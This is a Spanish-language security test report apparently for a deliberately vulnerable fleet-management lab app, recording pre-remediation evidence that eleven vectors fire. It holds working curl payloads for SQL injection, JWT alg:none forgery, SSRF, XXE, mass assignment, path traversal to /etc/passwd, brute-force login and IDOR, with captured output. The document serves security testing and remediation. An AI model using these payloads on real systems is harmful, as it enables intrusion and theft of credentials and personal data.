# Preflight · Evidencia de disparo de los 11 vectores (pre-remediación)

> Cierra el DoD de FSEC-12 ("cada vector dispara") y establece el baseline pre-remediación para FSEC-17.
> Entorno: `docker compose -f app/docker-compose.yml up -d` · Fecha: 2026-08-02 · Base: [`app/smoke-tests.http`](../../app/smoke-tests.http).
> Cada bloque = comando ejecutado + salida real capturada.

---

### V-01 · SQL Injection — ✅ dispara
```bash
# Boolean-based (toda la PII):
curl -s "http://localhost:8080/api/drivers/search?q=%27%20OR%20%271%27%3D%271"
# → [{"ID":1,"CEDULA":"79123456",...},{"ID":2,...},{"ID":3,...}]   (3 conductores)
# UNION (passwords en claro):
curl -s "http://localhost:8080/api/drivers/search?q=' UNION SELECT NULL,password,... FROM drivers --"
# → [{"USERNAME":"Bogota2026"},{"USERNAME":"Medellin2026"},{"USERNAME":"admin123"}]
# FILE_READ (archivo local):  → {"USERNAME":"7375deff774f\n"}  (/etc/hostname)
# Stacked query (RCE): → HTTP 500, BLOQUEADO (sink de un solo statement)
```

### V-02 · JWT alg:none — ✅ dispara
```bash
curl -s -X POST http://localhost:8080/api/auth/validate -H "Content-Type: application/json" \
  -d '{"token":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiJ9."}'
# → {"role":"ADMIN","sub":"admin","valid":true}   (token sin firma aceptado)
```

### V-03 · SSRF — ✅ dispara
```bash
curl -s -X POST http://localhost:8080/api/vehicles/1/webhook -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:8080/v3/api-docs"}'
# → {"status":200,"body":"{\"openapi\":\"3.0.1\",...}"}   (fetch server-side)
# IMDS 169.254.169.254 → intento sin validar destino (timeout local; creds IAM en EC2)
```

### V-04 · XXE — ✅ dispara
```bash
curl -s -X POST http://localhost:8080/api/vehicles/import -H "Content-Type: application/xml" \
  --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><r>&xxe;</r>'
# → {"parsed":"c9cdf39b5a43\n"}   (archivo local leído vía entidad externa)
```

### V-05 · Mass Assignment — ✅ dispara (escritura persistente)
```bash
curl -s -X PATCH http://localhost:8080/api/drivers/2 -H "Content-Type: application/json" \
  -d '{"phone":"+57 9999999999","role":"ADMIN","email":"pwned@evil.com"}'
# re-lectura en otra request:
curl -s "http://localhost:8080/api/drivers/search?q=1015998877"
# → phone=+57 9999999999 | role=ADMIN | email=pwned@evil.com   (persistió en la BD)
```

### V-06 · Path Traversal — ✅ dispara
```bash
curl -s "http://localhost:8080/api/reports/download?file=../../../../../../etc/passwd"
# → root:x:0:0:root:/root:/bin/sh
#   bin:x:1:1:bin:/bin:/sbin/nologin ...   (/etc/passwd fuera del dir de reportes)
```

### V-07 · Missing Rate Limiting — ✅ dispara
```bash
for i in $(seq 1 15); do curl -s -o /dev/null -w "%{http_code} " -X POST \
  http://localhost:8080/api/auth/login -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"x'$i'"}'; done
# → 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401   (sin 429/lockout)
```

### V-08 · PII en logs — ✅ dispara
```bash
curl -s "http://localhost:8080/api/drivers/search?q=Ana" >/dev/null
docker exec fleetsec-vulnerable-app grep -iE "cedula|email" /app/logs/fleetsec-app.log | tail -1
# → ... datos=[{ID=3, CEDULA=52334455, EMAIL=ana.perez@fleetsec.co, PHONE=+57 3157766554, ...}]
#   PII en texto plano en el log persistido
```

### V-09 · IDOR — ✅ dispara
```bash
curl -s "http://localhost:8080/api/drivers/2/trips"
# → [{"id":1,"driverId":2,"origin":"Bogotá - Terminal","destination":"Chía - CC Fontanar",...}]
#   viajes de otro conductor, sin ownership check (iterar id = enumerar todos)
```

### V-10 · Hardcoded Credentials — ✅ dispara
```bash
# login con la contraseña de application.yml:
curl -s -X POST http://localhost:8080/api/auth/login -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FleetS3c@dm1n-2026!"}'
# → {"role":"ADMIN","token":"eyJhbGciOiJIUzI1NiI..."}
# forja de token con el JWT secret hardcoded:
# → {"role":"ADMIN","sub":"attacker","valid":true}   (token forjado aceptado)
```

### V-11 · Missing Auth Enforcement (bonus) — ✅ dispara
```bash
# TODOS los endpoints responden sin header Authorization:
curl -s "http://localhost:8080/api/drivers/search?q=Ana"        # PII, anónimo → 200
curl -s "http://localhost:8080/api/drivers/2/trips"             # viajes, anónimo → 200
curl -s -X PATCH "http://localhost:8080/api/drivers/2" ...      # modificación, anónimo → 200
curl -s "http://localhost:8080/api/reports/download?file=..."   # archivos, anónimo → 200
# Ningún endpoint exige token.
```

---

**Resultado:** 11/11 vectores disparan sobre la app pre-remediación. Evidencia adicional automatizada en el pipeline (SARIF de SAST/DAST en GitHub Code Scanning) para los vectores de doble fuente. Detalle de cada uno en [`../findings/V-XX.md`](../findings/).
